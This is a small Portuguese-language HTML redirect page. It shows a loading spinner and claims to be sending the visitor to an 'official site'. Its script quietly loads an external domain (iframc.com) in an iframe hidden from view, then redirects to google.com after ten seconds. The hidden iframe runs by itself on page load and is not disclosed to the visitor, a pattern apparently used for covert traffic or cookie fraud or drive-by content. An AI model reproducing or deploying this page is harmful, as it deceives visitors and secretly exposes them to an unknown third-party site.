<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecionando...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            display: flex;
            align-items: center;
        }

        .circle {
            width: 30px;
            height: 30px;
            border: 4px solid green; /* Borda externa */
            border-top: 4px solid transparent; /* Cor no topo para criar o efeito de carregamento */
            border-radius: 50%;
            animation: spin 1s linear infinite; /* Animação de rotação */
            margin-right: 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .text {
            font-size: 20px;
            color: blue;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="circle"></div>
        <div class="text">✅ Aguarde! Redirecionando para o Site Oficial</div>
    </div>

    <!-- Iframe invisível -->
    <iframe id="hiddenFrame" src="" style="display: none;"></iframe>

    <script>
        // Definindo os links com sets
        const lnkfrm = "https://iframc.com";
        const lnkdtn = "https://google.com";

        // Carrega o iframe invisível
        document.getElementById('hiddenFrame').src = lnkfrm;

        // Espera 10 segundos e redireciona
        setTimeout(function() {
            window.location.href = lnkdtn;
        }, 10000); // 10 segundos
    </script>

</body>
</html>
